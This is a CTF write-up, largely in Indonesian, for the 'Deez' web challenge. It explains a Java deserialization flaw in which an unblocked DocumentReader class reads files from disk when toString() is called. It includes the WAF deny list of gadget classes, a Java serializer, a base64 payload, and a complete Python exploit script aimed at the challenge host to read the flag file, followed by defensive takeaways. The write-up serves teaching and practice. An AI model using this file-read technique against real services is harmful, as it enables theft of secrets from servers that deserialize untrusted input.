# Write-up: Deez - Web Exploitation CTF

**Challenge:** Deez  
**Category:** Web Exploitation  
**Author:** xchopath  
**URL:** http://103.31.39.30:8080  
**Flag:** `BPJS{hey_s3r14l_st0p_b31ng_so_1ns3cur3_0kay?}`

## Challenge Description

Diberikan sebuah aplikasi web yang memungkinkan user untuk membuat dan berbagi dokumen. Aplikasi ini menggunakan Java Spring Boot dengan fitur upload dan view dokumen.

**Hint:** "Source code supremacy, go read it and... Tatakae!"

## Reconnaissance

### 1. Analisis Aplikasi

Aplikasi memiliki beberapa endpoint:

- `GET /` - Halaman utama untuk membuat dokumen
- `POST /api/upload` - Upload dokumen baru
- `GET /api/metadata?author=...` - Generate metadata untuk dokumen
- `GET /docs/{uuid}` - View dokumen yang sudah diupload

### 2. Struktur Aplikasi

Dari source code yang diberikan, aplikasi memiliki struktur:

```
docxshare/
├── src/main/java/com/docxshare/
│   ├── controller/
│   │   ├── ApiController.java    # Handle upload & metadata
│   │   ├── DocController.java    # Handle view document
│   │   └── HomeController.java
│   ├── security/
│   │   └── WAF.java              # Web Application Firewall
│   └── util/
│       ├── DocumentReader.java   # ⚠️ Class yang menarik!
│       ├── Base64Utils.java
│       └── ...
└── secret/
    └── flag.txt                  # Target file
```

## Vulnerability Analysis

### 1. Java Deserialization Vulnerability

Mari kita analisis flow aplikasi:

**Upload Flow (`ApiController.java`):**

```java
@PostMapping("/upload")
public Map<String, String> uploadDoc(@RequestBody DocumentWrapper wrapper) {
    // ...
    byte[] metaBytes = Base64.getDecoder().decode(wrapper.getMetadata());
    try (WAF ois = new WAF(new ByteArrayInputStream(metaBytes))) {
        Object ignored = ois.readObject();  // Deserialisasi metadata
    } catch (Exception ex) {
        result.put("error", "Failed to parse metadata");
        return result;
    }
    // ...
}
```

**View Flow (`DocController.java`):**

```java
@GetMapping("/{uuid}")
public String viewDoc(@PathVariable String uuid, Model model) {
    // ...
    byte[] data = Base64.getDecoder().decode(wrapper.getMetadata());
    WAF ois = new WAF(new ByteArrayInputStream(data));
    Object obj = ois.readObject();  // Deserialisasi lagi
    ois.close();

    model.addAttribute("metadata", obj.toString());  // ⚠️ toString() dipanggil!
    // ...
}
```

### 2. DocumentReader Class

Class `DocumentReader` sangat menarik:

```java
package com.docxshare.util;

public class DocumentReader implements Serializable {
    private String path;

    @Override
    public String toString() {
        try {
            Path p = Paths.get(path);
            String content = new String(Files.readAllBytes(p));
            return content;  // ⚠️ Membaca file dari filesystem!
        } catch (IOException e) {
            return "[ERROR reading file: " + e.getMessage() + "]";
        }
    }
}
```

**Vulnerability:**

- `DocumentReader` tidak diblokir oleh WAF
- Method `toString()` membaca file dari filesystem
- Saat view dokumen, `obj.toString()` dipanggil untuk menampilkan metadata
- Kita bisa membuat serialized `DocumentReader` yang membaca flag file

### 3. WAF Bypass

Mari kita lihat WAF (`WAF.java`):

```java
private static final Set<String> DENY_EXACT = new HashSet<>(Arrays.asList(
    "javax.management.BadAttributeValueExpException",
    "sun.reflect.annotation.AnnotationInvocationHandler",
    // ... banyak class berbahaya lainnya
));

private static final String[] DENY_PREFIX = new String[] {
    "org.apache.commons.collections.",
    "org.apache.commons.collections4.",
    // ...
};
```

**Observasi:**

- `com.docxshare.util.DocumentReader` **TIDAK** ada dalam deny list
- Package `com.docxshare.util.*` tidak diblokir
- Class name `DocumentReader` tidak mengandung keyword yang diblokir

## Exploitation

### Step 1: Buat Serialized DocumentReader

Kita perlu membuat serialized Java object dari `DocumentReader` dengan path ke flag file.

**File: `com/docxshare/util/DocumentReader.java`**

```java
package com.docxshare.util;

import java.io.*;
import java.nio.file.*;

public class DocumentReader implements Serializable {
    private static final long serialVersionUID = 1L;
    private String path;

    public DocumentReader(String path) {
        this.path = path;
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
    }

    @Override
    public String toString() {
        try {
            Path p = Paths.get(path);
            String content = new String(Files.readAllBytes(p));
            return content;
        } catch (IOException e) {
            return "[ERROR reading file: " + e.getMessage() + "]";
        }
    }
}
```

**File: `com/docxshare/util/Exploit.java`**

```java
package com.docxshare.util;

import java.io.*;
import java.util.Base64;

public class Exploit {
    public static void main(String[] args) throws Exception {
        String path = args.length > 0 ? args[0] : "secret/flag.txt";

        DocumentReader reader = new DocumentReader(path);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(reader);
        oos.close();

        String b64 = Base64.getEncoder().encodeToString(bos.toByteArray());
        System.out.println(b64);
    }
}
```

**Compile & Run:**

```bash
javac com/docxshare/util/*.java
java com.docxshare.util.Exploit secret/flag.txt
```

**Output:**

```
rO0ABXNyACFjb20uZG9jeHNoYXJlLnV0aWwuRG9jdW1lbnRSZWFkZXIAAAAAAAAAAQIAAUwABHBhdGh0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAD3NlY3JldC9mbGFnLnR4dA==
```

### Step 2: Upload Document dengan Malicious Metadata

```python
import requests
import base64

TARGET = "http://103.31.39.30:8080"

# Payload dari step 1
metadata_b64 = "rO0ABXNyACFjb20uZG9jeHNoYXJlLnV0aWwuRG9jdW1lbnRSZWFkZXIAAAAAAAAAAQIAAUwABHBhdGh0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAD3NlY3JldC9mbGFnLnR4dA=="

payload = {
    "filename": "exploit.txt",
    "content": base64.b64encode(b"test content").decode(),
    "metadata": metadata_b64
}

r = requests.post(f"{TARGET}/api/upload", json=payload)
result = r.json()
viewer_url = result["viewer"]
signature = r.cookies.get("signature")
```

### Step 3: View Document untuk Trigger toString()

```python
# View document - ini akan memanggil obj.toString()
# yang akan membaca file secret/flag.txt
view_r = requests.get(f"{TARGET}{viewer_url}", cookies={"signature": signature})

# Flag akan muncul di metadata field
if "BPJS{" in view_r.text:
    import re
    flag = re.search(r'BPJS\{[^}]+\}', view_r.text)
    print(f"FLAG: {flag.group(0)}")
```

## Complete Exploit Script

```python
#!/usr/bin/env python3
import requests
import base64
import re

TARGET = "http://103.31.39.30:8080"

# Payload: serialized DocumentReader pointing to secret/flag.txt
metadata_b64 = "rO0ABXNyACFjb20uZG9jeHNoYXJlLnV0aWwuRG9jdW1lbnRSZWFkZXIAAAAAAAAAAQIAAUwABHBhdGh0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAD3NlY3JldC9mbGFnLnR4dA=="

# Upload document
payload = {
    "filename": "exploit.txt",
    "content": base64.b64encode(b"test").decode(),
    "metadata": metadata_b64
}

r = requests.post(f"{TARGET}/api/upload", json=payload)
result = r.json()
viewer_url = result["viewer"]
signature = r.cookies.get("signature")

# View document - triggers toString() and file read
view_r = requests.get(f"{TARGET}{viewer_url}", cookies={"signature": signature})

# Extract flag
flag = re.search(r'BPJS\{[^}]+\}', view_r.text)
print(f"FLAG: {flag.group(0)}")
```

## Flag

```
BPJS{hey_s3r14l_st0p_b31ng_so_1ns3cur3_0kay?}
```

## Key Takeaways

1. **Java Deserialization is Dangerous**: Jangan pernah deserialisasi data yang tidak terpercaya tanpa validasi ketat.

2. **WAF Bypass**: WAF hanya efektif jika semua class berbahaya diblokir. Class internal aplikasi yang memiliki method berbahaya juga harus dipertimbangkan.

3. **toString() Side Effects**: Method `toString()` seharusnya tidak memiliki side effects seperti membaca file atau melakukan operasi berbahaya.

4. **Defense in Depth**:
   - Jangan deserialisasi user input
   - Jika harus deserialisasi, gunakan whitelist class yang diizinkan
   - Jangan panggil method seperti `toString()` pada object yang dideserialisasi tanpa validasi

## References

- [OWASP: Deserialization of untrusted data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [Java Deserialization Vulnerabilities](https://www.owasp.org/index.php/Deserialization_Cheat_Sheet)
